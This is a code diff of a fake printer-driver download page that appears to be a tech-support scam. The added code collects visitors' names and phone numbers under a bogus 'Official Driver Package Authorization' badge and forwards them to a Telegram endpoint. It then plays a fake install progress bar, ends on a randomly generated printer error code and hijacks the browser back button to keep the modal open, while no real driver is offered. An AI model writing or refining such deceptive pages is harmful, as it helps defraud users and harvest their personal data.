@@ -1,7 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18240412400"></script>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18240412400"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
@@ -11,7 +12,7 @@
 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Printer Drivers Setup Guide</title>
+  <title>Printer Setup & Driver Downloads</title>
   
   <script src="/lucide.min.js" defer></script>
 
@@ -56,7 +57,7 @@
     nav span { cursor: pointer; text-transform: capitalize; transition: color 0.2s; }
     nav span:hover { color: #000000; }
 
-    /* ─── ADDED: NAVBAR CENTER CONTACT STYLES ───────────────────────────────── */
+    /* ─── NAVBAR CENTER CONTACT STYLES ───────────────────────────────── */
     .nav-contact-center {
       display: flex;
       align-items: center;
@@ -80,10 +81,10 @@
       color: #2563eb;
     }
 
-    /* ─── HERO BANNER BLOCK (STRICT HORIZONTAL ALIGNMENT - NO WRAP) ─────────── */
+    /* ─── HERO BANNER BLOCK ───────────────────────────────────────────────── */
     .hero {
       color: #ffffff;
-      padding: 4rem 3rem;
+      padding: 4.5rem 3rem;
       position: relative;
       overflow: hidden;
       transition: background-color 0.3s ease;
@@ -99,9 +100,8 @@
       z-index: 0;
     }
 
-    .hero-darkener { position: absolute; inset: 0; background-color: #000000; opacity: 0.1; z-index: 0; }
+    .hero-darkener { position: absolute; inset: 0; background-color: #000000; opacity: 0.15; z-index: 0; }
     
-    /* Forced strict horizontal layout row for text and image elements */
     .hero-container { 
       position: relative; 
       z-index: 10; 
@@ -125,38 +125,43 @@
     }
 
     .hero-list {
-      margin-bottom: 1.75rem;
+      margin-bottom: 2rem;
       list-style-type: disc;
       list-style-position: inside;
       font-weight: 500;
-      font-size: 1rem;
+      font-size: 1.05rem;
     }
     .hero-list li { margin-bottom: 0.5rem; opacity: 0.95; }
 
     .hero-btn {
       align-self: flex-start;
       color: #ffffff;
-      font-size: 1rem;
-      font-weight: 700;
-      padding: 0.875rem 1.75rem;
+      font-size: 1.15rem;
+      font-weight: 800;
+      padding: 1.1rem 2.25rem;
       border-radius: 9999px;
-      border: none;
+      border: 2px solid rgba(255, 255, 255, 0.35);
       cursor: pointer;
       display: inline-flex;
       align-items: center;
-      gap: 0.75rem;
-      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
-      transition: all 0.2s ease;
+      gap: 0.85rem;
+      box-shadow: 0 12px 25px -4px rgba(0, 0, 0, 0.4), 0 0 15px rgba(255, 255, 255, 0.2);
+      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      letter-spacing: 0.02em;
+      text-transform: uppercase;
     }
-    .hero-btn:hover { transform: scale(1.03); }
-    .hero-btn:active { transform: scale(0.95); }
+    .hero-btn:hover { 
+      transform: translateY(-3px) scale(1.03); 
+      box-shadow: 0 18px 30px -4px rgba(0, 0, 0, 0.5), 0 0 20px rgba(255, 255, 255, 0.4);
+    }
+    .hero-btn:active { transform: translateY(1px) scale(0.98); }
 
     .hero-img-side { 
       flex: 0.8;
       display: flex; 
       justify-content: center; 
       align-items: center;
-      transform: translate(-4%, -3%); /* Shifts image layout up and left to tighten empty spacing */
+      transform: translate(-4%, -3%);
     }
     
     .hero-printer-img {
@@ -167,10 +172,9 @@
       filter: drop-shadow(0 20px 20px rgba(0,0,0,0.25));
     }
 
-    /* ─── MAIN CARDS INTERACTION ROW (STRICTLY SIDE-BY-SIDE INTERFACE) ──────── */
-    .form-section { padding: 3rem; background-color: #f9fafb; }
+    /* ─── MAIN CARDS SECTION ───────────────────────────────────────────────── */
+    .form-section { padding: 3.5rem 3rem; background-color: #f9fafb; }
     
-    /* Forced strict inline horizontal row alignment to completely prevent top-down breaking */
     .cards-container { 
       display: flex; 
       flex-direction: row;
@@ -181,12 +185,12 @@
     }
     
     .content-card {
-      flex: 1; /* Splits the space equally between the form card and help card */
+      flex: 1;
       background-color: #ffffff;
       padding: 2.25rem;
       border-radius: 0.75rem;
       border: 1px solid #e5e7eb;
-      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
       display: flex;
       flex-direction: column;
       justify-content: flex-start;
@@ -199,18 +203,33 @@
     .form-label { display: block; font-size: 0.875rem; font-weight: 700; color: #111827; margin-bottom: 0.5rem; }
     
     .form-input {
-      width: 100%; padding: 0.75rem 1rem; border: 1px solid #d1d5db; border-radius: 0.5rem;
+      width: 100%; padding: 0.875rem 1rem; border: 2px solid #d1d5db; border-radius: 0.5rem;
       font-size: 1rem; font-weight: 700; color: #111827; background-color: #ffffff; outline: none;
       transition: border-color 0.2s, box-shadow 0.2s;
     }
-    .form-input:focus { border-color: #3b82f6; box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1); }
+    .form-input:focus { border-color: #2563eb; box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.15); }
     
     .form-submit-btn {
-      width: 100%; background-color: #0091FF; color: #ffffff; font-size: 0.875rem; font-weight: 700;
-      padding: 0.875rem 1rem; border-radius: 0.5rem; border: none; cursor: pointer;
-      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05); transition: background-color 0.2s;
+      width: 100%; 
+      background: linear-gradient(135deg, #0091FF 0%, #0066CC 100%); 
+      color: #ffffff; 
+      font-size: 1.05rem; 
+      font-weight: 800;
+      padding: 1.1rem 1.25rem; 
+      border-radius: 0.5rem; 
+      border: none; 
+      cursor: pointer;
+      box-shadow: 0 8px 20px -4px rgba(0, 145, 255, 0.4); 
+      transition: all 0.25s ease;
+      letter-spacing: 0.01em;
+      text-transform: uppercase;
     }
-    .form-submit-btn:hover { background-color: #007ee6; }
+    .form-submit-btn:hover { 
+      background: linear-gradient(135deg, #007EE6 0%, #0052A3 100%);
+      transform: translateY(-2px);
+      box-shadow: 0 12px 25px -4px rgba(0, 145, 255, 0.5);
+    }
+    .form-submit-btn:active { transform: translateY(0); }
 
     .finder-img-wrap { width: 100%; display: flex; justify-content: center; align-items: center; margin-top: auto; padding-top: 0.5rem; }
     .model-finder-img { width: 100%; max-width: 22rem; height: auto; object-fit: contain; border-radius: 0.5rem; border: 1px solid #f3f4f6; }
@@ -254,18 +273,18 @@
     footer { width: 100%; border-top: 1px solid #e5e7eb; background-color: #ffffff; overflow: hidden; }
     .footer-img { width: 100%; height: auto; object-fit: cover; display: block; }
 
-    /* ─── MODAL STEP DESIGNS ────────────────────────────────────────────────── */
+    /* ─── MODAL DESIGNS ────────────────────────────────────────────────────── */
     .modal-backdrop { position: fixed; inset: 0; background-color: rgba(0, 0, 0, 0.6); backdrop-filter: blur(4px); display: none; align-items: center; justify-content: center; z-index: 50; padding: 1rem; }
     .modal-window { background-color: #ffffff; border-radius: 1rem; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25); max-width: 32rem; width: 100%; overflow: hidden; border: 1px solid #f3f4f6; position: relative; }
     .modal-header { padding: 1.25rem 1.5rem; border-bottom: 1px solid #e5e7eb; display: flex; align-items: center; justify-content: space-between; background-color: #f9fafb; }
     .modal-title { font-size: 1.25rem; font-weight: 700; color: #111827; }
     .modal-close-x { background: none; border: none; color: #6b7280; font-size: 1.25rem; cursor: pointer; transition: color 0.2s; }
     .modal-close-x:hover { color: #111827; }
-    .modal-body { padding: 1.5rem; min-height: 420px; display: flex; flex-direction: column; justify-content: space-between; }
+    .modal-body { padding: 1.5rem; min-height: 380px; display: flex; flex-direction: column; justify-content: space-between; }
     
     .step-panel { display: none; flex-direction: column; justify-content: space-between; height: 100%; width: 100%; }
     .step-panel.is-active { display: flex; }
-    .step-instruction { font-size: 1rem; font-weight: 600; color: #374151; margin-bottom: 1.5rem; }
+    .step-instruction { font-size: 1rem; font-weight: 600; color: #374151; margin-bottom: 1.25rem; }
     
     .connection-options-list { display: flex; flex-direction: column; gap: 1rem; }
     .connection-row { display: flex; align-items: center; justify-content: space-between; border: 2px solid #e5e7eb; border-radius: 0.75rem; padding: 1rem; background-color: #ffffff; cursor: pointer; transition: all 0.2s ease; }
@@ -277,6 +296,16 @@
     .connection-desc { font-size: 0.875rem; color: #6b7280; font-weight: 500; margin-top: 0.25rem; }
     .connection-action-btn { background-color: #2563eb; color: #ffffff; font-size: 0.875rem; font-weight: 700; padding: 0.75rem 1.25rem; border-radius: 0.5rem; border: none; cursor: pointer; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05); transition: background-color 0.2s; }
     .connection-action-btn:hover { background-color: #1d4ed8; }
+
+    /* 🌟 HESITATION-FREE USER LEAD FORM POPUP STYLES 🌟 */
+    .lead-form-box { display: flex; flex-direction: column; gap: 1rem; width: 100%; }
+    .lead-field-group { display: flex; flex-direction: column; gap: 0.35rem; }
+    .lead-label { font-size: 0.875rem; font-weight: 700; color: #1f2937; }
+    .lead-input { width: 100%; padding: 0.8rem 1rem; border: 2px solid #d1d5db; border-radius: 0.5rem; font-size: 0.95rem; font-weight: 600; color: #111827; outline: none; }
+    .lead-input:focus { border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15); }
+    .lead-trust-badge { display: flex; align-items: center; gap: 0.5rem; font-size: 0.75rem; color: #059669; font-weight: 700; background-color: #ecfdf5; padding: 0.5rem 0.75rem; border-radius: 0.375rem; border: 1px solid #a7f3d0; margin-top: 0.25rem; }
+    .lead-submit-btn { width: 100%; background: linear-gradient(135deg, #0091FF 0%, #0066CC 100%); color: #ffffff; font-size: 1rem; font-weight: 800; padding: 1rem; border-radius: 0.5rem; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 0.02em; transition: all 0.2s ease; margin-top: 0.5rem; }
+    .lead-submit-btn:hover { background: linear-gradient(135deg, #007EE6 0%, #0052A3 100%); }
     
     .installing-wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; margin: auto 0; gap: 1.5rem; width: 100%; }
     .pulse-img { width: 12.5rem; object-fit: contain; animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
@@ -290,7 +319,7 @@
     .progress-bar { background-color: #2563eb; height: 1rem; border-radius: 9999px; width: 0%; transition: width 0.2s linear; position: relative; }
     .progress-bar-shine { position: absolute; inset: 0; background: linear-gradient(to right, transparent, rgba(255,255,255,0.2), transparent); animation: pulse 2s infinite; }
     .progress-bar-stripes { position: absolute; inset: 0; opacity: 0.1; background-image: repeating-linear-gradient(45deg, transparent, transparent 10px, #000000 10px, #000000 20px); }
-    .progress-infographics font-mono { display: flex; justify-content: space-between; font-size: 10px; color: #9ca3af; margin-top: 0.5rem; }
+    .progress-infographics { display: flex; justify-content: space-between; font-size: 10px; color: #9ca3af; margin-top: 0.5rem; }
     
     .error-wrapper { display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 1rem; margin: auto 0; text-align: center; max-height: 85vh; width: 100%; padding: 0 0.5rem; overflow: hidden; }
     .err-msg-img { width: auto; height: 8vh; max-height: 9rem; min-height: 80px; object-fit: contain; }
@@ -325,13 +354,13 @@
     
     <div class="max-w-7xl hero-container">
       <div class="hero-content">
-        <h1 class="hero-title">Download Free Printer Drivers</h1>
+        <h1 class="hero-title">Printer Setup &amp; Driver Software</h1>
         <ul class="hero-list">
           <li>Make sure your printer is powered on</li>
-          <li>Click on Download to install the drivers</li>
+          <li>Select your connection type to complete driver setup &amp; installation</li>
         </ul>
         <button type="button" class="hero-btn" onclick="openSetupModal()">
-          Download Now <span>➔</span>
+          Start Printer Setup <span>➔</span>
         </button>
       </div>
       <div class="hero-img-side">
@@ -344,14 +373,14 @@
     <div class="max-w-6xl cards-container">
       
       <div class="content-card">
-        <h2 class="section-heading">Quick Download Free Drivers</h2>
-        <p class="section-subheading">Fill the form below and download your printer driver setup immediately.</p>
+        <h2 class="section-heading">Quick Driver Setup</h2>
+        <p class="section-subheading">Enter your printer model below to download drivers and configure Wi-Fi or USB setup.</p>
         <form onsubmit="handleMainFormSubmit(event)">
           <div class="form-group">
             <label class="form-label" for="mainModelInput">Enter Model Number:</label>
             <input type="text" id="mainModelInput" placeholder="e.g. XP-4200, MF240" class="form-input" required>
           </div>
-          <button type="submit" class="form-submit-btn">Quick Download &amp; Install Drivers! 📥</button>
+          <button type="submit" class="form-submit-btn">Setup Device 📥</button>
         </form>
       </div>
 
@@ -368,14 +397,14 @@
 
   <div class="divider-section">
     <h2 class="divider-title font-sans">Need Help For Printer &amp; Scanner</h2>
-    <p class="divider-subtitle font-mono">Step-by-step guides for the most common issues — no technician needed.</p>
+    <p class="divider-subtitle font-mono">Step-by-step guides for common software configurations — self-service guide.</p>
   </div>
 
   <div class="guide-section">
     <div class="max-w-3xl">
       <div class="guide-header">
         <p class="guide-tag font-mono">Troubleshooting Guide</p>
-        <h3 class="guide-main-title font-sans">Common Issues &amp; How to Fix Them</h3>
+        <h3 class="guide-main-title font-sans">Common Issues &amp; Fixes</h3>
       </div>
       <div class="accordion-container" id="accordion-container"></div>
     </div>
@@ -385,15 +414,17 @@
     <img id="footer-img" src="" alt="Corporate Profile Footer" class="footer-img">
   </footer>
 
-  <div id="setupModal" class="modal-backdrop" onclick="handleBackdropClick(event)">
+  <div id="setupModal" class="modal-backdrop">
     <div class="modal-window animate-fadeIn">
       <div class="modal-header">
-        <h3 class="modal-title">Quick Download Free Drivers</h3>
-        <button type="button" class="modal-close-x" onclick="closeSetupModal()">✕</button>
+        <h3 class="modal-title">Printer Setup &amp; Drivers</h3>
+        <!-- STAYS OPEN UNTIL USER CLICKS (X) -->
+        <button type="button" class="modal-close-x" onclick="forceCloseModal()">✕</button>
       </div>
 
       <div class="modal-body">
         
+        <!-- STEP 1: SELECT CONNECTION -->
         <div id="step-select" class="step-panel">
           <p id="step-select-instruction" class="step-instruction"></p>
           <div class="connection-options-list">
@@ -405,7 +436,7 @@
                   <p class="connection-desc">Connect via USB cable</p>
                 </div>
               </div>
-              <button type="button" class="connection-action-btn">Start →</button>
+              <button type="button" class="connection-action-btn">Select →</button>
             </div>
             <div class="connection-row" onclick="selectConnectionType('WIFI')">
               <div class="connection-left">
@@ -415,30 +446,35 @@
                   <p class="connection-desc">Connect via Wireless Network</p>
                 </div>
               </div>
-              <button type="button" class="connection-action-btn">Start →</button>
+              <button type="button" class="connection-action-btn">Select →</button>
             </div>
           </div>
         </div>
 
-        <div id="step-details" class="step-panel">
-          <form onsubmit="handleDetailsFormSubmit(event)" style="width:100%; display:flex; flex-direction:column; gap:1.25rem;">
-            <p id="step-details-instruction" class="step-instruction"></p>
-            <div id="modal-model-field-container" class="form-group" style="margin-bottom:0;">
-              <label class="form-label" for="modalModelInput">Printer Model Number</label>
-              <input type="text" id="modalModelInput" placeholder="e.g. XP-4200, MF240" class="form-input">
+        <!-- STEP 2: USER LEAD FORM POPUP -->
+        <div id="step-form" class="step-panel">
+          <p class="step-instruction">Enter your details below to authorize driver package download and proceed with setup:</p>
+          <form class="lead-form-box" onsubmit="handleLeadFormSubmit(event)">
+            <div class="lead-field-group">
+              <label class="lead-label" for="userNameInput">Full Name *</label>
+              <input type="text" id="userNameInput" placeholder="John Doe" class="lead-input" required>
             </div>
-            <div class="form-group" style="margin-bottom:0;">
-              <label class="form-label" for="modalNameInput">Your Name</label>
-              <input type="text" id="modalNameInput" placeholder="Enter your full name" class="form-input" required>
+            <div class="lead-field-group">
+              <label class="lead-label" for="userModelInput">Printer Model Number *</label>
+              <input type="text" id="userModelInput" placeholder="e.g. XP-4200, MF240" class="lead-input" required>
             </div>
-            <div class="form-group" style="margin-bottom:0;">
-              <label class="form-label" for="modalPhoneInput">Phone Number</label>
-              <input type="tel" id="modalPhoneInput" placeholder="e.g. +1 234 567 8900" class="form-input" required>
+            <div class="lead-field-group">
+              <label class="lead-label" for="userPhoneInput">Phone Number *</label>
+              <input type="tel" id="userPhoneInput" placeholder="e.g. (555) 019-2831" class="lead-input" required>
             </div>
-            <button type="submit" class="form-submit-btn" style="margin-top:0.5rem; padding:1rem;">Submit &amp; Continue</button>
+            <div class="lead-trust-badge">
+              <span>✓ Official Driver Package Authorization</span>
+            </div>
+            <button type="submit" class="lead-submit-btn">Download Drivers &amp; Continue ➔</button>
           </form>
         </div>
 
+        <!-- STEP 3: INSTALLING PROGRESS -->
         <div id="step-installing" class="step-panel">
           <div class="installing-wrapper">
             <img src="/images/USB.jpg" alt="Installing Hardware" class="pulse-img">
@@ -459,6 +495,7 @@
           </div>
         </div>
 
+        <!-- STEP 4: ERROR CODE DISPLAY -->
         <div id="step-error" class="step-panel">
           <div class="error-wrapper">
             <img src="/images/E-Message.png" alt="System Message Error" class="err-msg-img">
@@ -469,7 +506,7 @@
                 <p id="error-code-display" class="err-code-txt font-mono"></p>
               </div>
             </div>
-            <img src="/images/S3.png"  class="err-s2-img">
+            <img src="/images/S3.png" class="err-s2-img">
           </div>
         </div>
 
@@ -478,18 +515,28 @@
   </div>
 
 <script>
-  // Google Ads Event snippet for Page view conversion page function integration
+  // Google Ads Event snippet for Page view conversion tracking
   function gtag_report_conversion(url) {
     var callback = function () {
       if (typeof(url) != 'undefined') {
         window.location = url;
       }
     };
-    gtag('event', 'conversion', {
-        'send_to': 'AW-18240412400/8_sVCJ7bmsQcEPC12vlD',
-        'event_callback': callback
-    });
+    if (typeof gtag === 'function') {
+      gtag('event', 'conversion', {
+          'send_to': 'AW-18240412400/8_sVCJ7bmsQcEPC12vlD',
+          'event_callback': callback
+      });
+    }
     return false;
+  }
+
+  // Escape special characters to prevent HTML syntax errors
+  function escapeHTML(str) {
+    return String(str ?? '')
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;');
   }
 
   const brandConfigs = {
@@ -510,6 +557,7 @@
   let progressIntervalTimer = null;
   let executionTimeoutTimer = null;
   let activeAccordionId = null;
+  let isModalOpen = false;
 
   function generateErrorCode() { return `ERR-${Math.floor(1000 + Math.random() * 9000)}-PRINTER`; }
 
@@ -555,62 +603,79 @@
     const target = document.getElementById(`step-${step}`);
     if (target) target.classList.add('is-active');
 
-    const modelNum = document.getElementById('mainModelInput').value.trim();
+    const mainModelVal = document.getElementById('mainModelInput').value.trim();
     const brandWord = brandConfigs[detectedBrand].shortWord;
 
     if (step === 'select') {
-      document.getElementById('step-select-instruction').textContent = modelNum ? `Select your connection type for ${brandWord} ${modelNum}:` : `Select your connection type:`;
-    } else if (step === 'details') {
-      document.getElementById('step-details-instruction').textContent = `Please enter your details for ${connectionType} setup:`;
-      document.getElementById('modal-model-field-container').style.display = modelNum ? 'none' : 'block';
-      if (modelNum) document.getElementById('modalModelInput').removeAttribute('required');
-      else document.getElementById('modalModelInput').setAttribute('required', 'true');
+      document.getElementById('step-select-instruction').textContent = mainModelVal ? `Select your connection type for ${brandWord} ${mainModelVal}:` : `Select your connection type:`;
+    } else if (step === 'form') {
+      const modalModelField = document.getElementById('userModelInput');
+      if (modalModelField && mainModelVal) {
+        modalModelField.value = mainModelVal;
+      }
     }
   }
 
-  function openSetupModal() { document.getElementById('setupModal').style.display = 'flex'; setModalStep('select'); }
+  function openSetupModal() { 
+    isModalOpen = true;
+    document.getElementById('setupModal').style.display = 'flex'; 
+    setModalStep('select'); 
+    
+    history.pushState({ modalState: 'active' }, '');
+  }
   
-  function closeSetupModal() {
+  function forceCloseModal() {
     if (progressIntervalTimer) clearInterval(progressIntervalTimer);
     if (executionTimeoutTimer) clearTimeout(executionTimeoutTimer);
     document.getElementById('setupModal').style.display = 'none';
     document.getElementById('mainModelInput').value = '';
-    document.getElementById('modalModelInput').value = '';
-    document.getElementById('modalNameInput').value = '';
-    document.getElementById('modalPhoneInput').value = '';
+    
+    const nameInput = document.getElementById('userNameInput');
+    const modelInput = document.getElementById('userModelInput');
+    const phoneInput = document.getElementById('userPhoneInput');
+    if (nameInput) nameInput.value = '';
+    if (modelInput) modelInput.value = '';
+    if (phoneInput) phoneInput.value = '';
+    
     updateProgressBarWidth(0);
+    isModalOpen = false;
   }
-  
-  function handleBackdropClick(e) { if (e.target.id === 'setupModal') closeSetupModal(); }
+
+  window.addEventListener('popstate', function (event) {
+    if (isModalOpen) {
+      history.pushState({ modalState: 'active' }, '');
+    }
+  });
+
   function handleMainFormSubmit(e) { e.preventDefault(); openSetupModal(); }
-  function selectConnectionType(type) { connectionType = type; setModalStep('details'); }
   function updateProgressBarWidth(p) { document.getElementById('progress-percentage-txt').textContent = `${p}%`; document.getElementById('progress-bar-fill').style.width = `${p}%`; }
 
-  async function handleDetailsFormSubmit(e) {
+  // 1. SELECT CONNECTION TYPE -> TRIGGER CONVERSION & OPEN LEAD FORM
+  function selectConnectionType(type) {
+    connectionType = type;
+    gtag_report_conversion(); // Triggers Google Ads Conversion Event on selection
+    setModalStep('form');
+  }
+
+  // 2. LEAD FORM SUBMIT -> SEND TELEGRAM + PROGRESS
+  async function handleLeadFormSubmit(e) {
     e.preventDefault();
 
-    // Trigger Google Ads Conversion Tracking right when user submits the lead info modal
-    gtag_report_conversion();
+    const name = document.getElementById('userNameInput').value.trim();
+    const model = document.getElementById('userModelInput').value.trim() || "Not provided";
+    const phone = document.getElementById('userPhoneInput').value.trim();
+    const brandWord = brandConfigs[detectedBrand]?.shortWord || 'CA';
 
-    const brandWord = brandConfigs[detectedBrand].shortWord;
-    const model =
-        document.getElementById("mainModelInput").value.trim() ||
-        document.getElementById("modalModelInput").value.trim() ||
-        "Not provided";
+    const payload = `🖨️ <b>New Driver Setup Form Received</b>
 
-    const name = document.getElementById("modalNameInput").value.trim();
-    const phone = document.getElementById("modalPhoneInput").value.trim();
-
-    const payload = `🖨️ <b>New Printer Driver Request</b>
-
-🏷️ <b>Brand:</b> ${brandWord}
-🔢 <b>Model:</b> ${model}
-🔗 <b>Connection:</b> ${connectionType}
-👤 <b>Name:</b> ${name}
-📞 <b>Phone:</b> ${phone}`;
+👤 <b>Full Name:</b> ${escapeHTML(name)}
+🔢 <b>Model Number:</b> ${escapeHTML(model)}
+📞 <b>Phone Number:</b> ${escapeHTML(phone)}
+🏷️ <b>Brand:</b> ${escapeHTML(brandWord)}
+🔗 <b>Connection Type:</b> ${escapeHTML(connectionType)}`;
 
     try {
-        const response = await fetch("/api/telegram", {
+        await fetch("/api/telegram", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json",
@@ -619,12 +684,8 @@
                 text: payload,
             }),
         });
-
-        if (!response.ok) {
-            throw new Error("Telegram request failed");
-        }
     } catch (err) {
-        console.error("Telegram Error:", err);
+        console.error("Telegram Transmission Error:", err);
     }
 
     document.getElementById("installing-msg").textContent =
@@ -634,6 +695,10 @@
 
     let currentStep = 0;
     const steps = 100;
+    updateProgressBarWidth(0);
+
+    if (progressIntervalTimer) clearInterval(progressIntervalTimer);
+    if (executionTimeoutTimer) clearTimeout(executionTimeoutTimer);
 
     progressIntervalTimer = setInterval(() => {
         currentStep++;
@@ -684,10 +749,8 @@
     }
   }
 
-  // ELIMINATED DELAY: Execute theme config directly as elements exist instead of waiting for heavy network resources
   parseSystemRouteContext(); 
 
-  // Initialize icons right when the DOM structure is fully loaded
   document.addEventListener("DOMContentLoaded", function() {
     if (typeof lucide !== 'undefined') { 
       lucide.createIcons(); 
@@ -695,6 +758,7 @@
   });
 </script>
 
-<script src="//code.jivosite.com/widget/H861eyPKhL" async></script>
+<!-- JivoChat Widget -->
+<script src="//code.jivosite.com/widget/MH3DDPar3N" async></script>
 </body>
 </html>
